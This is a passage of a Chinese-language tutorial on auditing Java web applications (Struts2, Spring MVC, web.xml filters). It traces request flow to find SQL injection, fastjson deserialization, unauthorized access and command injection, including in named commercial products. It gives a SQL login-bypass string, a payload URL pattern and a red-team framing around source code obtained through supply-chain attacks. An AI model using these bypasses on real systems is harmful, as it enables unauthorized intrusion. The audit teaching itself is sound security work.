+<h4 id="1-1-2-2-漏洞验证"><a href="#1-1-2-2-漏洞验证" class="headerlink" title="1.1.2.2. 漏洞验证"></a>1.1.2.2. <strong>漏洞验证</strong></h4><p>根据前面<code>3.1.1.2</code>介绍我们知道其请求路由为<code>/Gologin</code>，参数表现为</p>
+<p><code>username=aaa&amp;password=aaa</code></p>
+<p>根据漏洞位置我们模拟其sql语句为</p>
+<p><code>Select * from Admin where Admin_Username=&#39;username&#39; and Admin_Password=&#39;password&#39;</code></p>
+<p>所以登陆时我们可以使用万能用户名来进行登陆绕过</p>
+<p><code>admin&#39;or&quot;=&quot;or--+</code></p>
+<p><img src="/images/94/WYa92VOnZTtxfFi-BfTVvypxp-b37fu-gouu2v-5mSs.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h3 id="本章思考"><a href="#本章思考" class="headerlink" title="本章思考"></a><strong>本章思考</strong></h3><p>在示例中，我们可以看到映射配置中并没有配置具体处理方法，那怎么确定哪个方法是用来处理请求的呢？</p>
+<h4 id="Action-接口与-ActionSupport-类"><a href="#Action-接口与-ActionSupport-类" class="headerlink" title="Action**接口与**ActionSupport**类**"></a><strong>Action**</strong>接口与**<strong>ActionSupport**</strong>类**</h4><h5 id="Action-接口"><a href="#Action-接口" class="headerlink" title="Action**接口**"></a><strong>Action**</strong>接口**</h5><p>这个时候就要说到st2的特性，st2的核心功能就是action，对于开发人员来说，使用st2开发主要就是编写action，为了让开发action类更规范，st2提供了一个Action接口，接口如下所示</p>
+<p><img src="/images/94/2xbt9PA3nvHCl47ZPYbGTXhdc182yhN6Okhm7MRoDMc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>当使用Action接口创建action的时候，就必须要实现<code>execute</code>方法，回到思考问题上，此时的请求处理就由实现的<code>execute</code>方法执行，即方法实现要在该方法里编写</p>
+<h5 id="ActionSupport-类"><a href="#ActionSupport-类" class="headerlink" title="ActionSupport**类**"></a><strong>ActionSupport**</strong>类**</h5><p>除了实现Action接口之外也可以通过继承<code>ActionSupport</code>来创建action，因为<code>ActionSupport</code>是接口Action的实现类，所以就不用必须再重新实现<code>execute</code>方法，此时就可以自定义一些方法实现，即映射配置里指定的处理方法</p>
+<h2 id="1-1-S-pring"><a href="#1-1-S-pring" class="headerlink" title="1.1. S**pring**"></a>1.1. <strong>S**</strong>pring**</h2><h3 id="1-1-1-配置及依赖"><a href="#1-1-1-配置及依赖" class="headerlink" title="1.1.1. 配置及依赖"></a>1.1.1. 配置及依赖</h3><h4 id="1-1-1-1-S-pringmvc-xml"><a href="#1-1-1-1-S-pringmvc-xml" class="headerlink" title="1.1.1.1. S**pringmvc**.xml"></a>1.1.1.1. <strong>S**</strong>pringmvc**<strong>.xml</strong></h4><p>在springMVC配置文件中,<code>component-scan</code>是用来查找Controller类所在位置，<code>org.springframework.web.servlet.view.InternalResourceViewResolver</code>为自定义视图解析器</p>
+<p><img src="/images/94/qdCNdZFlGwe4FwThj_rK8Qd4Tob6n1IR7kDrqmaE488.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h4 id="1-1-1-2-pom-xml"><a href="#1-1-1-2-pom-xml" class="headerlink" title="1.1.1.2. pom**.xml**"></a>1.1.1.2. <strong>pom**</strong>.xml**</h4><p>它是Maven项目中的文件，使用XML表示，也可以由此判断该项目是否为maven项目，该配置文件通常用来声明项目信息、环境的配置、引用组件依赖等等</p>
+<p><img src="/images/94/NqHLOZ6Zw1XfChgS-6OynjX9eXlyAsOom5L6v01T-nA.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h3 id="1-1-2-层次介绍"><a href="#1-1-2-层次介绍" class="headerlink" title="1.1.2. 层次介绍"></a>1.1.2. 层次介绍</h3><p>通常在springmvc中</p>
+<p><strong>controller为业务逻辑层</strong>，用来接收用户的请求，然后将参数传递到Service层处理业务逻辑，由impl做具体实现，获取到结果后再返回传递，一般请求的url就写在controller中，比如</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span> <br><span class="hljs-meta">@RequestMapping(value = &quot;/hinovy&quot;)</span> <br></code></pre></div></td></tr></table></figure>
+<p>则请求url为<code>http://localhost/hinovy</code></p>
+<p>该层级的文件一般为<code>xxxcontroller.java</code>，比如<code>NovyController.java</code></p>
+<p> </p>
+<p><strong>Service**</strong>是业务接口层，**接收<code>Controller层</code>数据，与<code>DAO/Mapper层</code>交互，处理业务逻辑，生成<code>responseDTO</code>数据并返回<code>Controller层</code> ,该层文件一般为xxxServce.java，比如NovyService.java，此处是接口定义，就是定义一些方法，没有这些方法的实现，但是有时候数据操作会在这里发生</p>
+<p> </p>
+<p><strong>M**</strong>apper是数据持久层**，对数据库进行数据持久化操作，他的方法语句是直接针对数据库操作的，数据持久层文件通常都是<code>xxxMapper.xml</code>，比如<code>NovyMapper.xml</code>，它的上一层是Mapper.java，因为业务实现无法直接与xml层做数据交互，所以就要有一个接口来做中转。</p>
+<p> </p>
+<p><strong>D**</strong>ao是数据接口层**，一些数据请求（接口）会在这里发生（一般用于内部实现）</p>
+<p> </p>
+<p><strong>Entity**</strong>是实体处理层，**用于存放我们的实体类，与数据库中的属性值基本保持一致（定义前端传来的请求参数）</p>
+<p> </p>
+<p><strong>Implements**</strong>是服务实现层，**用来处理一些方法的实现（这个方法干了啥干了啥），该层文件一般为<code>xxxImpl.java</code>，比如<code>NovyImpl.java</code>，impl 是把mapper和service进行整合的文件，有时候一些sql操作也会发生在这里</p>
+<p> </p>
+<p>在web运行时处理请求的流程为<strong>Controller&lt;-&gt;Service&lt;-&gt;impl&lt;-&gt;mapper</strong></p>
+<h3 id="1-1-3-实例"><a href="#1-1-3-实例" class="headerlink" title="1.1.3. 实例"></a>1.1.3. 实例</h3><p>这里以含有漏洞的springboot项目做案例，Idea打开项目，等待依赖导入完成</p>
+<p><img src="/images/94/Pvi1ycOvZrjIO5U_U63enDgH-A42PMIrzZzs02YxavA.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>发生报错的就自己下载相关组件导入</p>
+<p>查看目录结构</p>
+<p><img src="/images/94/bL_IwGx9NQNDVIb0NjrnPVBzNFvICLZ0qvHyj_VVecs.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>按照3.2.2介绍得知流程为<strong>controller**</strong>-&gt;services-&gt;mapper**<strong>，</strong>按照3.2.2对pom的介绍，我们先看pom.xml引用了哪些组件，以此来找出包含漏洞版本的组件，然后再看controller及其他。</p>
+<p>在pom文件中，我们可以看到其引用了含有漏洞版本的fastjson</p>
+<p><img src="/images/94/gnZtMNKK7NqOehh64oMw0lR3tcguHdWM1g_P0TGgy3k.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>但是看到依赖还不行，要定位到用到该依赖的地方，可以全局搜<code>parseObject</code>或<code>parse</code>来查看请求是否可控。</p>
+<p>要找出所有业务逻辑层，可以在idea中利用file mask来查看所有controller：<code>*Controller.java</code>，或全局搜索<code>@Controller</code></p>
+<p><img src="/images/94/yq5-MY8A_S1uZEfRY_X-mFs6WRUxE-vTX2VPq-pnrik.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>随便点进一个搜索结果，从<code>3.2.2</code>介绍得知此处请求url为<code>/informlistpaging</code>，由<code>informListPaging</code>方法处理</p>
+<p><img src="/images/94/iNIcOTAcDSaGYfFV5uBZYkrAbIERufzOvEIuf3BVyhM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在此处我们可以看到<code>informListPaging</code>方法有很多注解，其中<code>@RequestParam</code>是获取请求参数，参数名为value值，拿basekey做例子，在该方法中被定义为字符串请求参数。在SpringMvc进行获取请求参数，常见的一般有三种：</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1.</span>request.getParameter(<span class="hljs-string">&quot;参数名&quot;</span>)<br><br><span class="hljs-number">2.</span>用<span class="hljs-meta">@RequestParam</span>注解获取<br><br><span class="hljs-number">3.</span>Springmvc默认支持的数据类型接收参数，可直接通过controller方法参数对应jsp中请求参数name直接获取<br></code></pre></div></td></tr></table></figure>
+<p>如果是<code>@RequestBody</code>则是获取整个请求体</p>
+<h4 id="1-1-1-1-代码分析"><a href="#1-1-1-1-代码分析" class="headerlink" title="1.1.1.1. 代码分析"></a>1.1.1.1. <strong>代码分析</strong></h4><p>pom.xml</p>
+<p><img src="/images/94/8G4KjJ2_WVlOGBXzQ3XLyDBKL5FgLP68_2DG7EyfDyw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>看到了存在漏洞的组件，全局搜索<code>json.parseObject</code>或<code>JSONObject.parseObject`` </code>来查找参数可控的地方</p>
+<p><img src="/images/94/oxiQLeU4W3W_skNuz8bqpaAMdHms3phMpQa88MoNT94.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在该类中<code>getCommonFields</code>方法里对<code>param</code>参数做了反序列化，但是还没有看到请求的url，所以要往上跟进该方法，看看有哪里调用了<code>getCommonFields</code></p>
+<p><img src="/images/94/OksuWgdZQXT-Z6I4VuUoQTyf4BAt31q146Lny71OupY.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在一处业务逻辑层中看到调用的地方，在该方法中，将参数<code>param</code>传进了<code>getCommonFields</code>方法进行反序列化，由于参数是可控的，所以我们可以直接利用，url请求表现为：</p>
+<p><code>/getCommonFields?param=url编码的payload</code></p>
+<p>同样的，按照<code>3.1.3.1</code>的思路，我们想要找注入就找到处理该参数的地方</p>
+<p>拿<code>informListPaging</code>方法的<code>basekey</code>参数为例</p>
+<p><img src="/images/94/zBpVWsn3KmONqhVeMm8LFGbj44tmiqONTgUGwA3NL-c.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在80行中，几个参数传进<code>sortMyNotice</code>方法进行处理，这里需要注意的是，<code>nm</code>并不是一个类，而是一个被定义的接口，所以我们需要注意<code>nm</code>在哪里被定义了</p>
+<p><img src="/images/94/ExtQQg693lOAQUFT6pUXNVPFyP2_9XC22eQqPxWQdwY.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>跟进<code>NoticeMapper</code></p>
+<p><img src="/images/94/J78NS2w5jCwJKJHIFsPZgjAJDHp6fJS5-nNlz2h08Eg.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>此处为数据持久层接口，为<code>nm</code>提供了<code>sortMyNotice</code>方法，但这里还不是数据库操作的地方，因为controller无法直接调用mapper.xml的方法，所以就需要这个mapper.java来做一个接口中转，所以我们根据<code>3.2.2</code>介绍，转到mapper.xml层</p>
+<p>全局搜索<code>sortMyNotice</code>方法</p>
+<p><img src="/images/94/-i_kglrMczGdcxhG7r_ps-5dBq996U4cdUygM3Zb-G8.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>转到notice-mapper.xml</p>
+<p><img src="/images/94/ghiiy5z5zpOaGpUn9DwxlHlowa5OFfmOLLapMvLPdGc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>此处的<code>select id</code>即为调用到的方法，往下为sql语句，我们可以看到在like后面直接用<code>%$&#123;&#125;%</code>进行模糊查询，没有对参数做预编译，导致了漏洞的产生</p>
+<h4 id="1-1-1-2-漏洞验证"><a href="#1-1-1-2-漏洞验证" class="headerlink" title="1.1.1.2. 漏洞验证"></a>1.1.1.2. <strong>漏洞验证</strong></h4><p>在<code>3.2.2</code>的介绍中得知，根据controller构造url：</p>
+<p><code>http://localhost/informlistpaging?baseKey=</code></p>
+<p><img src="/images/94/qxLZEb9G-JLSu7bEdOi3rCINhWiTaNMJTIqSTPjcd1s.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h3 id="本章思考-1"><a href="#本章思考-1" class="headerlink" title="本章思考"></a><strong>本章思考</strong></h3><p>有人会问按照介绍，那service层呢？在这里</p>
+<p><img src="/images/94/fbHAaTvjSRZ8RyanLQFC4oAs19kgvs_XRtxu4E2xT0M.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><code>imformRelationService</code>的<code>setList</code>方法对mapper处理返回的数据进行封装处理后返回到controller，然后controller返回到视图层，流程结束</p>
+<p><img src="/images/94/CLmsZ6R5o1YTaphZMzdP6u7ZOBFhIDImALGvA2yuW7U.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p> </p>
+<h5 id="service只是接口？"><a href="#service只是接口？" class="headerlink" title="service只是接口？"></a><strong>service只是接口？</strong></h5><p>有时候sql查询会直接发生在<code>XXXservice</code>，比如</p>
+<p>某个项目中的某个方法有个查询，定义了一个字符串参数<code>defkey</code></p>
+<p><img src="/images/94/XaGRVWqDcE6Pi6nzN6oBlDWzp9gKR8BlIeAX21faUFk.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>查看<code>wfservice</code>在哪里被定义，也可以直接ctrl+左键直接进入方法</p>
+<p><img src="/images/94/02T7OkwYMINDtylPswQhAWDCBcPu3bCJDjGaFYfBBqM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>跟进<code>WorkFlowService</code>，在该<code>WorkFlowService</code>中搜索前面调用到的<code>getHavedonePage</code>方法，在该方法中含有一条没有进行预编译sql查询，此处直接进行数据查询导致了漏洞的产生</p>
+<p><img src="/images/94/_TWEVPVzDJTeIzCIVTiptF4-FMBEQpV7B2TZp3AQhL8.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="/images/94/ULB2W5PiSPHPf3FPK29ErIHb0RDx8lfmJvDaOHWf330.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>所有这个名称是看开发，有时候文件名只是文件名，还是要具体看类名前置，如果是<code>public interface WorkFlowService</code>那说明这个类是接口类，具体操作不会发生在这里，这个时候就要找实现它的类</p>
+<h5 id="跟到接口断了"><a href="#跟到接口断了" class="headerlink" title="跟到接口断了"></a><strong>跟到接口断了</strong></h5><p>当跟进方法时跟到接口断了怎么办，比如出现这种情况</p>
+<p>controller里有一个密码重置</p>
+<p><img src="/images/94/4jeraathzV4Zn40QVcNnzepWvBBU2HujHtnIkC-buEg.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>跟进<code>updatePassword</code>方法</p>
+<p><img src="/images/94/2jIHU6G-7zzKfvSdsr72a1f3UUbIEDJGl0XXdaFHs6Y.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>到这里之后只看到提供给<code>userService</code>的<code>updatePassword</code>方法，没有看到具体的实现，</p>
+<p>不要慌，根据<code>3.2.2</code>的介绍，我们还有个impl没有看，有接口那必定有一个实现该接口的类。全局搜索<code>implements UserService</code></p>
+<p><img src="/images/94/l_1IhQ2d85v8SQy7kmG7hjB1cbi4c9v_L-Ho_nUCdZU.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>就可以看到对接口<code>UserService</code>的<code>updatePassword</code>方法的实现</p>
+<p><img src="/images/94/g84RdzSd18uTYbMI_c1ixlyf6m6kdzlCasiQVfH1w98.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这时候再继续往下跟就可以了，流程一样</p>
+<h5 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a><strong>返回结果</strong></h5><p>在spring项目中，<code>@Controller</code>跟<code>@RestController</code>的返回类型是不一致的</p>
+<h6 id="Controller"><a href="#Controller" class="headerlink" title="@Controller"></a><strong>@Controller</strong></h6><p>在使用<code>@Controller</code>注解时，该请求处理的返回结果需要配合视图解析器<code>InternalResourceViewResolver</code>才行，也就是说，当某个请求使用了<code>@Controller</code>，那么它return的内容就必须是前端页面，且页面文件必须存在，场景如下</p>
+<p><img src="/images/94/jSTQeFQCoTvGU4TDIKQG6wUVE6vA-nTofU2Vu3K5MM8.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>该controller将返回<code>hi</code>或<code>index</code>页面，此时静态资源中就要存在<code>hi</code>、<code>index.html</code>或<code>jsp</code>文件</p>
+<h6 id="Res-t-Controller"><a href="#Res-t-Controller" class="headerlink" title="@Res**t**Controller"></a><strong>@Res**</strong>t**<strong>Controller</strong></h6><p>如果只是使用<code>@RestController</code>注解，则Controller中的方法无法返回jsp页面，或者html，配置的视图解析器 <code>InternalResourceViewResolver</code>不起作用，返回的内容就是Return 里的内容。场景如下：</p>
+<p><img src="/images/94/CUWMpZ1OGtfanaqpHDTH8V9AOzJzxdOf7XhgCQgQCsE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>此时该controller返回的只是字符串hi或index，不会跳转到对应页面。</p>
+<h1 id="1-小技巧"><a href="#1-小技巧" class="headerlink" title="1. 小技巧"></a>1. <strong>小技巧</strong></h1><h2 id="1-1-命名"><a href="#1-1-命名" class="headerlink" title="1.1. 命名"></a>1.1. <strong>命名</strong></h2><p>无论是struts还是springmvc/boot，按照我的理解，为了方便区分和后续其他开发，除非另类命名（比如<code>3.1.3</code>），在整个请求处理流程中对于类名的前置命名都是一致的，比如</p>
+<p><strong>Novy</strong>Controller-&gt;<strong>Novy</strong>Service-&gt;(<strong>Novy</strong>ServiceImpl-&gt;)<strong>Novy</strong>Mapper.xml</p>
+<p>或者下一层级会多出个别字符<code>INovy</code>、<code>PNovy</code>等。而不会出现</p>
+<p><strong>Novy</strong>Controller-&gt;<strong>Test</strong>Service-&gt;(<strong>Why</strong>ServiceImpl-&gt;)<strong>Oasd</strong>Mapper.xml</p>
+<p>这种情况，所以在审计过程中跟进代码时利用全局搜索能更好的提高审计效率</p>
+<p><img src="/images/94/YYNMUOwvD9nF9cU1Kr4sCu08wWnqoGDCaZ6iiwt9Y-c.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>当然，有其他实现类实现统一接口的时候情况按前面本章思考说的层级跟进一样跟就行了</p>
+<h2 id="1-2-方法的跟进"><a href="#1-2-方法的跟进" class="headerlink" title="1.2. 方法的跟进"></a>1.2. <strong>方法的跟进</strong></h2><p>通常调用方法时都是类名.方法名，或者写了一个接口，然后再定义一次，如下</p>
+<p><code>private EntityManager em;</code></p>
+<p>这样em就可以用到<code>EntityManager</code>里的方法</p>
+<p>比如某个项目有一个序列化工具类<code>SerializeUtil</code>，在该类里有一个<code>deserialize</code>方法来反序列化接收的request数据</p>
+<p><img src="/images/94/sS9QgkQ6LplKU2l3dwmsvqCBWtMBJ4NnEvp3UWK48MU.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>而在controller中定义了一个接口<code>fvlh</code></p>
+<p><img src="/images/94/8HVW5PIyG0ds9amUXejUPH6EUiE8q6io4RKfwH_PZcc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后进行调用</p>
+<p><code>fvlh.deserialize(request);</code></p>
+<p><img src="/images/94/Kx6YeNhVYTyRzkuKG5Vt83Fc85sNj8l8xrXD92YAWYI.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>如果我们想找反序列化漏洞就在跟进时可以直接<code>ctrl+左键（idea）</code>来跟进<code>deserialize</code>方法查看具体实现，或者先查看哪里定义了<code>fvlh</code>，然后再根据接口实现去跟进<code>deserialize</code>方法进行漏洞跟踪即可</p>
+<h1 id="1-进阶"><a href="#1-进阶" class="headerlink" title="1. 进阶"></a>1. <strong>进阶</strong></h1><h2 id="红队快速审计"><a href="#红队快速审计" class="headerlink" title="红队快速审计"></a><strong>红队快速审计</strong></h2><p>在开始之前，需要继续再了解一下过滤器和处理器映射器。说到过滤器，还有一种拦截器，过滤器关注的是web请求，拦截器关注的是方法调用，比如拦截敏感词汇，有关两者的区别可以自行百度。在红队实施工程中，大都喜欢通过供应链攻击来获得目标项目源码以进行下一步针对性打点。在获得的源码中，java类项目除了springboot之外，一般都以war包的形式基于tomcat部署。接下来就说一下再得到源码之后如何快速找到入口并审出漏洞</p>
+<h3 id="过滤器之-Web-xml"><a href="#过滤器之-Web-xml" class="headerlink" title="过滤器之**Web.xml**"></a><strong>过滤器之**</strong>Web.xml**</h3><p><code>Web.xml</code>是Java Web项目中的一个配置文件，主要用于配置首页、Filter、Listener、Servlet等。 tomcat在部署启动web应用时，会解析加载<code>$&#123;CATALINA_HOME&#125;/conf</code>目录下所有web应用通用的web.xml，然后解析加载web应用目录中的<code>WEB-INF/web.xml</code> 。<code>conf/web.xml</code>文件中的设定会应用于所有的web应用程序，而web应用程序的<code>WEB-INF/web.xml</code>中的设定只应用于该应用程序本身。</p>
+<h4 id="web-xml加载过程"><a href="#web-xml加载过程" class="headerlink" title="web.xml加载过程"></a><strong>web.xml加载过程</strong></h4><p>1,、启动Web项目时，容器(tomcat)会去读取web.xml文件的<code>&lt;/listener&gt;</code>和<code> &lt;/context-param&gt;</code>两个标签节点；</p>
+<p>2、容器创建一个<code>ServletContext</code>(上下文环境)；</p>
+<p>3、容器以的<code>name作为键</code>，<code>value作为值</code>，将其转化为键值对，存入<code>ServletContext</code>。</p>
+<p>4、容器创建<code>&lt;/listener&gt;</code>中的类实例，根据配置的class类路径<code>&lt;listener-class&gt;</code>来创建监听，在监听中会有<code>contextInitialized(ServletContextEvent args)</code>初始化方法，启动Web应用时，系统调用<code>Listener</code>的该方法。</p>
+<p>5、容器初始化<code>&lt;/filter&gt;</code>，web.xml中可以定义多个 filter，<strong>初始化每个**</strong> filter 时，是按照 filter 配置节出现的顺序来初始化的，当请求资源匹配多个 filter-mapping 时，filter 拦截资源是按照 filter-mapping 配置节出现的顺序来依次调用 doFilter() 方法**</p>
+<p>6、容器初始化<code>&lt;/servlet&gt;</code></p>
+<p>有关web.xml标签的解释，可以查看<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7f834dd090fe">https://www.jianshu.com/p/7f834dd090fe</a></p>
+<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a><strong>Filter</strong></h3><p>过滤器的本质就是一个实现了 Filter 接口的 Java 类，具体表现如下图，针对请求的处理就发生在doFilter方法中。当执行完语句或满足某种条件时就会放行当前请求进入下一个过滤器 <code>chain.doFilter</code></p>
+<p><img src="/images/94/7vn1l2u0Pea2en2giAKDDLd_74zeGZItxHyRWut7Yo0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>还有一种是通过实现<code>Servlet</code>接口来响应用户请求，表现如下图，处理请求的实现就在<code>service</code>方法中，其继承的<code>HttpServlet</code>就是<code>Servlet</code>接口的实现类（他还继承了<code>GenericServlet</code>，<code>GenericServlet</code>才是直接实现Servlet的抽象类。每个处理器都有个核心方法，如拦截器就是<code>preHandle</code>、<code>postHandle</code>）</p>
+<p><img src="/images/94/Pc-UmWQtmikf2-1MK-FxMSmIE54K1aH_cEQQF4EfQO4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h3 id="非注解处理器映射器"><a href="#非注解处理器映射器" class="headerlink" title="非注解处理器映射器** **"></a><strong>非注解处理器映射器**</strong> **</h3><p>其配置场景感觉跟strust2的差不多，有两种写法</p>
+<p>第一种: BeanNameUrlHandlerMapping</p>
+<p><img src="/images/94/Fs-I02d9nWWaBX221zf4RcI1Bh2zQ8WUMa55muoz-4Q.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><code>name属性</code>就是请求url，class是负责处理请求的类</p>
+<p>第二种：SimpleUrlHandlerMapping</p>
+<p><img src="/images/94/vXhvQgyvMQjXVHqJQWgBB2iihvtwJLGeMnMc2EfIz3g.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><code>prop key</code>会根据其标签值去查找对应的<code>bean id</code>，再根据bean标签对应的Handler（即class）处理请求，这里的<code>prop key=&quot;/queryUsers1.action&quot;</code>也是请求url，同一个bean可以有多个url映射</p>
+<h4 id="快速审计"><a href="#快速审计" class="headerlink" title="快速审计"></a><strong>快速审计</strong></h4><h5 id="案例一、"><a href="#案例一、" class="headerlink" title="案例一、"></a><strong>案例一、</strong></h5><p>这里以war项目为例，再得到源码之后解压，直接打开WEB-INF下的Web.xml查看过滤映射配置</p>
+<p><img src="/images/94/ThjAXYuiRJXxdMOvjXxZTYOvH2-R-wM8yH7yyJPg1DQ.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在idea里，还要右键lib目录，将依赖导入到项目中</p>
+<p><img src="/images/94/-XmSt1nw0QxboSsIwIKkS46MnQcM029iz1sQxeUyBpU.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>回到web.xml</p>
+<p><img src="/images/94/5rNw4jcWizPMTQyZvbR38AyiGIcKtUDRoEXBxgNJAsU.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><code>servlet-name</code>标签标示过滤器名称，每个过滤器处理一个或多个请求。图中名为<code>JsInvokeServlet</code>的过滤器由<code>nc.bs.framework.js.servlet.JsInvokeServlet</code>类实现。该过滤器主要用于处理<code>/jsinvoke/*</code>请求，即<code>&lt;url-pattern&gt;</code>标签</p>
+<p>我们直接<code>ctrl+左键</code>点击<code>JsInvokeServlet</code>进入<code>JsInvokeServlet</code>类查看实现，如果<code>JsInvokeServlet</code>爆红，请确认lib有没有被导入，或者可以双击shift键搜索</p>
+<p><img src="/images/94/9mxjVafaK73tfOEvuKchCix-lq0o1g5cUhSBv-HOUuA.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>进入到<code>JsInvokeServlet</code>后看其核心方法</p>
+<p><img src="/images/94/b81pYuru6ZvcBJDS7jMj4ahrLABE4bhRCxcud88wFbs.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>跟进<code>service</code>直到看到有方法的实现，这里他将req、rep对象传进下一个<code>service</code>，继续跟进</p>
+<p><img src="/images/94/PhqfuXx1ua0WphPAI9yzq7KHKeZdIr3rb6b1IWxMFUg.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在下一层的<code>service</code>方法中看到对请求的响应处理</p>
+<p><img src="/images/94/mp7GO_j9a5UkEW1sdB1Z9BYmsPcPV2T-tV0NaRj-OAs.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这个时候再根据对应的实现跟进就可以查看有无漏洞了。像这种只有一个过滤器，且实现里没有针对<code>/jsinvoke/*</code>请求的登录校验，那么这里就存在一个未授权访问漏洞。验证漏洞时其url组成为<code>项目名+&lt;url-pattern&gt;标签值</code>。默认情况下，只要项目不在tomcat的ROOT目录里，那么项目文件夹名也是url组成的一部分，如图，拼接得到<code>/uapjs/jsinvoke/</code></p>
+<p><img src="/images/94/3F1aWdxrgltQtKgJxzTY7EKvsOLTRG0iTzhPoyPzMFw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="/images/94/O33bL1OGiMnKNkJowRYIhPyB5ECi7XdyBzkW4hg6-xw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h5 id="案例二、"><a href="#案例二、" class="headerlink" title="案例二、"></a><strong>案例二、</strong></h5><p>还是查看<code>WEB-INF/web.xml</code></p>
+<p><code>com.inspur.tsce4.monPhysicalView.Servlet</code>处理<code>/monPhysicalView</code>请求</p>
+<p><img src="/images/94/Nr6Akt0AgJB-fK9SvrCjFlabokVwmDUWbWh5gRlYFqw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在Servlet类中，会将请求交到<code>Management</code>对象处理</p>
+<p><code>WEB-INF/classes/com/inspur/tsce4/monPhysicalView/Servlet.class</code></p>
+<p><img src="/images/94/1LxYoo8MCUt6AV59I-SLr9hgWw89dxP6ZDctVAFdafA.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="/images/94/Z_kT_CvPcwJpGGTRryt5cJ3l3QMusWy9veFPitCLKdA.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在<code>doResponse</code>方法中，获取请求参数<code>op</code>，当参数值是<code>systemShutdown</code>时就会进到<code>systemShutdown</code>方法</p>
+<p><img src="/images/94/TmJrDipkVmGytYrOIchN_uSWeIg2Xen_5XMdbjb0SwA.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在<code>systemShutdown</code>方法中，又从请求中获取参数，将参数传到<code>Command</code>的<code>systemShutdown</code>方法</p>
+<p><img src="/images/94/q0kMfVfB5MeM8JXBKVpiNhEzFZHb8iFZSgWcOCz2fAg.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><code>WEB-INF/classes/com/inspur/tsce4/monPhysicalView/Command.class</code></p>
+<p>继续传到<code>doCommand</code>方法</p>
+<p><img src="/images/94/fQm3dQAyOdmenINeWSkrGhE-W-6R9LPriuUJcq1Hv_8.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><code>doCommand</code>方法中因为调用了系统shell，所以可以使用管道符进行命令拼接，导致命令执行漏洞产生</p>
+<p><img src="/images/94/zMvusi0Zokp6EK0OmUNXsRoa_g714nxW2EmwDmm2Yw4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>示例：</p>
+<p><img src="/images/94/uhUUAAjoYdiN6xquvOQjt-FJEm2eD0nxl2SygfiGFXk.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="/images/94/brfEbrhkETTnh4b59Gfjl6DGoKDipVRAG3TzY08wrz8.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>根据案例一介绍，搭配web.xml的映射配置，url为：</p>
